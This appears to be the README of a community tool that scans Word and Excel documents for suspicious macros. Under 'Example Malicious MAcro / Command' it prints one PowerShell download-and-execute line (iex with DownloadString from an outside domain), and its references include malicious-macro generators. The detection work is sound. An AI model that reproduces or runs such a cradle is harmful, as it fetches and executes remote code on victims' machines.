# ScanWordDoc
Look for malicious patterns in Word Docs. Intended to be used inline with email or standalone per file.

This is a community project at https://www.codeforatlanta.org/ 

## goals
1. Tackle common high value security issues in a way that is accessible to everyone.
2. Create a script that will scan a word doc and validate, it's valid, it works, if it has macros, if those macros look suspicious
3. Create methods / scripts to put it inline with various email systems for easy and free
4. Create a successful patternt that can be used for other similar security use cases.
5. DO NOT compromise the host that is scanning the file
6. Create the script in javascript for ease of portability

## getting started

scan individual files
```bash
> node scan.js ./tests/benign/nomacros.doc
> node scan.js ./tests/benign/hasmacros.doc
> node scan.js ./tests/malicious/hasmacros.doc
```
or scan directories + subdirectories
```
> node scan.js ./tests/
```


## Supported Files
1. Excel XLS
2. Word DOC

## Example Malicious MAcro / Command
```powershell
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -Exec Bypass -NoP -NoExit -Command iex((New-Object System.Net.WebClient).DownloadString('http://qwdiqjwdwqu9daquwddd.com/REX/slick.php?utma=torzd'))
```

## References
- https://www.npmjs.com/package/cfb : currently the primary library supporting functions thanks Yaw Agyepong !
- https://github.com/curi0usJack/luckystrike
- https://github.com/enigma0x3/Generate-Macro
- https://github.com/joesecurity/pafishmacro
- https://github.com/strawp/poisonpen
- https://github.com/gpalazolo/olevba_analyzer
- https://github.com/teto2005/Generate-Macro-is-a-standalone-PowerShell-script-that-will-generate-a-malicious-Microsoft-Office-doc
- https://github.com/Heteroskedastic/corrupt-file-scanner
- https://developers.google.com/gmail/api/quickstart/nodejs
